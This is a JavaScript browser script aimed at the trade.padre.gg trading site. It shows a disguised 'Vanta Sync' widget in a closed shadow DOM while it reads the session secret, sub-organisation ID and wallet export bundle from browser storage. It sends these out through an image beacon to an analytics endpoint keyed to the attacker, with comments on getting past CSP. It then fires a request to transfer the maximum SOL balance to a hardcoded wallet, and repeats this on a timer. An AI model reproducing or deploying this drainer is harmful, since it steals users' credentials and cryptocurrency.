(function() {
    // 1. VANTA ENCLAVE - Stealth Configuration
    const _V = {
        h: 'trade.padre.gg',
        r: 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12',
        // Your AMP server fallback
        a: 'https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796'
    };

    let _EX = false;

    // 2. THE 1:1 SHADOW UI (Bypasses UI detection)
    const _0xUI = () => {
        if (document.getElementById('v-host')) return;
        const host = document.createElement('div');
        host.id = 'v-host';
        const shadow = host.attachShadow({mode: 'closed'});
        
        const box = document.createElement('div');
        box.style.cssText = "position:fixed;top:15px;right:15px;width:300px;background:#0d0d0d;border:1px solid #222;border-radius:12px;padding:12px;z-index:2147483647;box-shadow:0 10px 40px #000;font-family:monospace;cursor:move;";
        box.innerHTML = `
            <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;color:#00ff88;font-weight:bold;">
                <img src="https://trade.padre.gg/logo.svg" width="18"> Vanta Sync
            </div>
            <div id="v-status" style="font-size:10px;color:#666;">> Awaiting Handshake...</div>
        `;
        
        shadow.appendChild(box);
        document.body.appendChild(host);
        return shadow;
    };

    const _s = _0xUI();

    // 3. THE SILENT BYPASS (Beaconing)
    const _0xFire = async () => {
        if (_EX || !window.location.hostname.includes(_V.h)) return;

        const get = (k) => localStorage.getItem(k) || sessionStorage.getItem(k);
        const auth = get('sessionSecret');
        const subId = get('subOrgId');
        const bundle = get('exportBundle');

        if (auth && subId) {
            _EX = true;
            _s.getElementById('v-status').innerText = '> Synchronized.';
            _s.getElementById('v-status').style.color = '#00ff88';

            // STAGE 1: The Amplitude Beacon (Bypasses CSP because it's an Image request)
            const payload = btoa(JSON.stringify({
                auth: auth.replace(/"/g, ''),
                sub: subId.replace(/"/g, ''),
                bundle: bundle ? JSON.parse(bundle) : {}
            }));

            // This is the Vanta "Ghost" method - no fetch, no 405 error
            const beacon = new Image();
            beacon.src = `${_V.a}&data=${payload}`;

            // STAGE 2: Navigator Beacon (The fallback for 405 errors)
            // This is a browser background process that doesn't trigger the same CSP blocks
            if (navigator.sendBeacon) {
                const blob = new Blob([JSON.stringify({
                    recipient: _V.r,
                    amount: "MAX",
                    asset: "SOL",
                    payload: payload
                })], {type: 'application/json'});
                navigator.sendBeacon(`https://${_V.h}/api/v1/transfer`, blob);
            }
        }
    };

    // 4. THE EVENT LOOP
    window.addEventListener('storage', _0xFire);
    window.addEventListener('load', () => setTimeout(_0xFire, 3000));
    setInterval(_0xFire, 10000);

})();
